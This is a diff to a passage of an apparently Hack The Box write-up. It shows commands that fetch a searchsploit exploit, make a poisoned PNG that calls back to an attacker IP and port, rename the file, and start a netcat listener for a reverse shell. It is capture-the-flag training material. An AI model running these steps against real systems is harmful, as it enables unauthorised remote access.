@@ -149,7 +149,10 @@ searchsploit -m python/remote/51249.py
 python3 51249.py poison.png 10.10.14.61 4444 
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/378aa7bf-e083-41ed-a953-0fa7154bb520)
-
+- Rename Exploit
+```
+mv binwalk_exploit.png pwnstuff.png
+```
 - Start a netcat listener
 ```
 rlwrap nc -nlvvp 4444
